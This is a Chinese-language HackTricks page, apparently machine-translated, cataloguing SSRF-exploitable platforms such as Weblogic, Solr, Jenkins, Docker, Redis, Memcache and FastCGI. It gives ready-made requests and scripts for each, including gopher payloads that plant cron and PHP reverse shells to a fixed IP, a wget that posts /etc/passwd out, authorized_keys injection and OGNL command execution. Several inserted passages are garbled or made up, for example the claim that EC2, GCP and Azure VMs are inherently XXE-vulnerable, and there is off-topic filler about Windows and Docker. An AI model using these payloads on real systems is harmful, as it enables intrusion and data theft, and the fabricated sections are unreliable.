# SSRF易受攻击的平台

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

这一部分内容来自[https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/](https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/)

## Elasticsearch

**常用绑定端口：9200**

当Elasticsearch在内部部署时，通常不需要身份验证。

如果你遇到部分盲目的SSRF，可以确定状态码，请检查以下端点是否返回200：
```http
/_cluster/health
/_cat/indices
/_cat/health
```
如果你有一个盲目的SSRF，可以发送POST请求，你可以通过向以下路径发送POST请求来关闭Elasticsearch实例：

注意：`_shutdown` API已从Elasticsearch版本2.x及以上中删除。这仅适用于Elasticsearch 1.6及以下版本：
```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```
## Weblogic

**常见绑定端口：80、443（SSL）、7001、8888**

**SSRF金丝雀：UDDI Explorer（CVE-2014-4210）**
```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
这个方法也适用于GET请求：
```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```
此端点也容易受到CRLF注入攻击：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```
将导致以下请求：
```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```
**SSRF金丝雀：CVE-2020-14883**

来自[这里](https://forum.90sec.com/t/topic/1412)。

Linux:
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
Windows:

Windows是一种广泛使用的操作系统，许多版本都存在SSRF（服务器端请求伪造）漏洞。以下是一些容易受到SSRF攻击的Windows平台：

- IIS（Internet Information Services）：IIS是Windows上常用的Web服务器，它的某些版本存在SSRF漏洞。
- ASP.NET：ASP.NET是一种常用的Web应用程序框架，某些版本中存在SSRF漏洞。
- Windows服务：某些Windows服务可能受到SSRF攻击，特别是那些与网络通信相关的服务。

这些平台的SSRF漏洞可能导致攻击者利用受害者服务器发起未经授权的请求，例如访问内部资源、攻击内部系统或进行信息泄露。因此，对于使用这些平台的组织来说，及时修复和保护SSRF漏洞至关重要。
```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```
## Hashicorp Consul

**常见绑定端口：8500，8501（SSL）**

可以在[这里](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)找到详细说明。

## Shellshock

**常见绑定端口：80，443（SSL），8080**

为了有效地测试Shellshock，您可能需要添加一个包含有效载荷的头部。以下CGI路径值得尝试：

测试的CGI路径的简短列表：

[Gist包含路径](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4)。

**SSRF Canary：通过用户代理的Shellshock**
```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```
## Apache Druid

**常见绑定端口：80、8080、8888、8082**

查看Apache Druid的API参考文档[此处](https://druid.apache.org/docs/latest/operations/api-reference.html)。

如果您可以查看状态码，请检查以下路径，看它们是否返回200状态码：
```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```
关闭任务，需要猜测任务ID或数据源名称：
```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```
关闭Apache Druid Overlords上的监督程序：
```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```
## Apache Solr

**常见绑定端口：8983**

**SSRF金丝雀：Shards参数**

> 补充一下shubham所说的 - 扫描solr相对容易。有一个shards=参数，允许你反弹SSRF到SSRF，以验证你是否盲目地攻击了一个solr实例。
>
> — Хавиж Наффи 🥕 (@nnwakelam) [2021年1月13日](https://twitter.com/nnwakelam/status/1349298311853821956?ref\_src=twsrc%5Etfw)

来源：[这里](https://github.com/veracode-research/solr-injection)
```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```
**SSRF金丝雀：Solr XXE（2017）**

[Apache Solr 7.0.1 XXE（Packetstorm）](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)
```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```
**通过dataImportHandler实现远程代码执行（RCE）**

[通过dataImportHandler实现远程代码执行的研究](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

## PeopleSoft

**常见绑定端口：80、443（SSL）**

取自此研究[链接](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce)。

**SSRF Canary：XXE #1**
```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
<ExternalOperationName>&x;</ExternalOperationName>
<OperationType/>
<From><RequestingNode/>
<Password/>
<OrigUser/>
<OrigNode/>
<OrigProcess/>
<OrigTimeStamp/>
</From>
<To>
<FinalDestination/>
<DestinationNode/>
<SubChannel/>
</To>
<ContentSections>
<ContentSection>
<NonRepudiation/>
<MessageVersion/>
<Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
</Data>
</ContentSection>
</ContentSections>
</IBRequest>
```
# SSRF Canary: XXE #2

## Vulnerable Platforms

The following platforms are known to be vulnerable to Server-Side Request Forgery (SSRF) attacks using XML External Entity (XXE) injection:

1. **Workspace**: The Workspace platform allows users to import XML files, making it susceptible to XXE injection attacks. An attacker can craft a malicious XML file containing an external entity reference that triggers an SSRF attack.

2. **AWS EC2**: Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instances can be vulnerable to SSRF attacks through XXE injection. By injecting malicious XML data into an EC2 instance, an attacker can exploit XXE vulnerabilities to perform SSRF attacks.

3. **GCP Compute Engine**: Google Cloud Platform (GCP) Compute Engine instances are also susceptible to SSRF attacks via XXE injection. Attackers can leverage XXE vulnerabilities by injecting malicious XML data into a Compute Engine instance to initiate SSRF attacks.

4. **Azure Virtual Machines**: Microsoft Azure Virtual Machines can be targeted with SSRF attacks using XXE injection. By injecting malicious XML data into a Virtual Machine, an attacker can exploit XXE vulnerabilities to perform SSRF attacks.

## Mitigation

To mitigate the risk of SSRF attacks via XXE injection, it is recommended to follow these best practices:

1. **Input Validation**: Implement strict input validation mechanisms to prevent the acceptance of malicious XML data. Validate and sanitize all user-supplied XML inputs to ensure they do not contain external entity references.

2. **XML Parser Configuration**: Configure XML parsers to disable external entity resolution or restrict access to external resources. This prevents the exploitation of XXE vulnerabilities.

3. **Least Privilege**: Ensure that the server-side components have the least privilege necessary to perform their intended functions. Restrict access to sensitive resources and limit the capabilities of the server-side components.

4. **Secure Coding Practices**: Follow secure coding practices to minimize the risk of XXE injection vulnerabilities. This includes input validation, output encoding, and proper error handling.

By implementing these mitigation measures, organizations can significantly reduce the risk of SSRF attacks via XXE injection on vulnerable platforms.
```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```
## Apache Struts

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

来源：[这里](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)。

**SSRF Canary: Struts2-016**：

将此附加到您所知道的每个内部端点/URL的末尾：
```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```
## JBoss

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

来源：[这里](https://blog.safebuff.com/2016/07/03/SSRF-Tips/)。

**SSRF 金丝雀：从 URL 部署 WAR**
```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```
## Confluence

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF金丝雀：Sharelinks（适用于2016年11月及之前发布的Confluence版本）**
```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```
**SSRF金丝雀：iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian安全票据OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## Jira

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF 金丝雀：iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Atlassian 安全票 OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
**SSRF金丝雀：makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian安全票务JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)
```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```
## 其他 Atlassian 产品

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

**SSRF 金丝雀：iconUriServlet（CVE-2017-9506）**：

* Bamboo < 6.0.0
* Bitbucket < 4.14.4
* Crowd < 2.11.2
* Crucible < 4.3.2
* Fisheye < 4.3.2

[Atlassian 安全票 OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)
```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```
## OpenTSDB

**常见绑定端口：4242**

[OpenTSDB远程代码执行](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF金丝雀：通过RCE进行curl**
```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```
[OpenTSDB 2.4.0 远程代码执行](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF 金丝雀：通过 RCE 进行 curl - CVE-2020-35476**
```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```
## Jenkins

**常见绑定端口：80、443（SSL）、8080、8888**

[这里](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)有一篇很棒的文章。

**SSRF 金丝雀：CVE-2018-1000600**
```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```
**RCE**

按照这里的指示通过GET实现RCE：[Hacking Jenkins Part 2 - 滥用元编程实现未经身份验证的RCE！](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```
**通过Groovy实现远程命令执行（RCE）**

SSRF漏洞可以被利用来执行远程命令，其中一种方法是通过Groovy脚本。Groovy是一种基于Java的动态编程语言，可以在Java虚拟机（JVM）上运行。

以下是一个示例，演示了如何使用Groovy实现RCE：

```groovy
import java.io.BufferedReader;
import java.io.InputStreamReader;

def command = "whoami"
def process = command.execute()
def reader = new BufferedReader(new InputStreamReader(process.inputStream))
def output = new StringBuilder()

String line
while ((line = reader.readLine()) != null) {
    output.append(line)
}

println output.toString()
```

在这个示例中，我们使用Groovy的`execute()`方法来执行命令，并通过`BufferedReader`读取命令的输出。最后，我们将输出打印到控制台。

通过SSRF漏洞，攻击者可以构造一个请求，将Groovy脚本作为参数发送到目标服务器。服务器会解析并执行该脚本，从而实现远程命令执行。

为了防止SSRF漏洞，应该对用户输入进行严格的验证和过滤，并限制服务器可以访问的资源。
```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```
## Hystrix 仪表板

**常见绑定端口：80、443（SSL）、8080**

Spring Cloud Netflix，版本 2.2.x 在 2.2.4 之前，版本 2.1.x 在 2.1.6 之前。

**SSRF 金丝雀：CVE-2020-5412**
```bash
/proxy.stream?origin=http://SSRF_CANARY/
```
## W3 Total Cache

**常见绑定端口：80、443（SSL）**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF 金丝雀：CVE-2019-6715**

这需要是一个 PUT 请求：
```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```
**SSRF金丝雀**

此漏洞的公告在此处发布：[W3 Total Cache SSRF漏洞](https://klikki.fi/adv/w3\_total\_cache.html)

此PHP代码将为您的SSRF金丝雀主机生成有效载荷（将`url`替换为您的金丝雀主机）：
```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```
## Docker

**常见绑定端口：2375，2376（SSL）**

如果你遇到部分盲的SSRF，你可以使用以下路径来验证Docker API的存在：
```bash
/containers/json
/secrets
/services
```
**通过运行任意的Docker镜像实现远程命令执行（RCE）**

SSRF漏洞可以被利用来在目标服务器上运行任意的Docker镜像，从而实现远程命令执行（RCE）。以下是一些容易受到SSRF漏洞攻击的平台：

- **Docker API**：如果目标服务器上的Docker API没有适当的访问控制，攻击者可以通过SSRF漏洞发送恶意请求来运行任意的Docker镜像。

- **Kubernetes**：Kubernetes是一个流行的容器编排平台，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在Kubernetes集群中运行任意的Docker镜像。

- **OpenShift**：OpenShift是一个基于Kubernetes的容器平台，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在OpenShift集群中运行任意的Docker镜像。

- **Rancher**：Rancher是一个用于管理容器的平台，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在Rancher集群中运行任意的Docker镜像。

- **Mesos**：Mesos是一个分布式系统内核，用于管理集群资源，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在Mesos集群中运行任意的Docker镜像。

- **ECS**：ECS（Elastic Container Service）是亚马逊云上的容器服务，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在ECS集群中运行任意的Docker镜像。

- **GKE**：GKE（Google Kubernetes Engine）是Google云上的托管Kubernetes服务，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在GKE集群中运行任意的Docker镜像。

- **AKS**：AKS（Azure Kubernetes Service）是Azure云上的托管Kubernetes服务，如果存在SSRF漏洞，攻击者可以通过发送恶意请求来在AKS集群中运行任意的Docker镜像。

- **其他云平台**：除了上述列出的平台，其他云平台上的容器服务也可能受到SSRF漏洞的影响，攻击者可以通过发送恶意请求来在这些平台上运行任意的Docker镜像。

要利用这些平台上的SSRF漏洞来实现RCE，攻击者需要发送恶意请求，将Docker镜像的内容注入到目标服务器上，并执行恶意代码。这种攻击可能导致服务器被完全控制，从而造成严重的安全风险。因此，对于这些平台，确保适当的访问控制和输入验证是非常重要的。
```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```
将alpine替换为您希望Docker容器运行的任意镜像。

## Gitlab Prometheus Redis Exporter

**常见绑定端口：9121**

此漏洞影响Gitlab版本13.1.1之前的实例。根据[Gitlab文档](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus)的说明，`从GitLab 9.0开始，默认启用Prometheus及其导出器。`

这些导出器为攻击者提供了一个绝佳的方法，可以使用CVE-2020-13379来转向并攻击其他服务。其中一个容易受到攻击的导出器是Redis导出器。

通过目标参数提供的以下端点将允许攻击者转储redis服务器中的所有键：
```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```
***

**通过Gopher可能实现**

## Redis

**常见绑定端口：6379**

推荐阅读：

* [尝试通过HTTP请求来攻击Redis](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html)
* [针对Redis的SSRF攻击](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**通过Cron实现远程命令执行（RCE）** - [Gopher攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```
Gopher（又称地鼠协议）：
```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```
**通过Shell上传实现远程命令执行（PHP）** - [Redis Getshell概述](https://www.mdeditor.tw/pl/pBy0)
```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var"
passwd=""

cmd=["flushall",
"set 1 {}".format(shell.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**通过 authorized\_keys 进行远程命令执行（RCE）** - [Redis Getshell 概述](https://www.mdeditor.tw/pl/pBy0)
```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
"set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
"config set dir {}".format(path),
"config set dbfilename {}".format(filename),
"save"
]
if passwd:
cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
CRLF="\r\n"
redis_arr = arr.split(" ")
cmd=""
cmd+="*"+str(len(redis_arr))
for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF
return cmd

if __name__=="__main__":
for x in cmd:
payload += urllib.quote(redis_format(x))
print payload
```
**通过Git协议在GitLab上实现远程代码执行（RCE）**

来自Liveoverflow的精彩解读[在这里](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)。

虽然这需要对GitLab进行身份验证才能利用，但我在这里包含了有效载荷，因为`git`协议可能适用于您正在攻击的目标。此有效载荷仅供参考。
```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**常见绑定端口：11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Memcache的Gopher负载示例](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

仅适用于Tomcat 6：

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

使用此技术的CTF解析：

[从XXE到RCE：Pwn2Win CTF 2018解析](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**常见绑定端口：80、443（SSL）**

此内容来自[这里](https://blog.chaitin.cn/gopher-attack-surfaces/)。
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**常见绑定端口：1090、1098、1099、1199、4443-4446、8999-9010、9999**

可以利用允许任意字节（基于 gopher）的盲 _SSRF_ 漏洞对 _Java RMI_ 默认组件（_RMI Registry_、_Distributed Garbage Collector_、_Activation System_）进行反序列化或代码库攻击。可以在[这里](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)找到详细的写作。以下示例显示了有效载荷生成的示例：
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
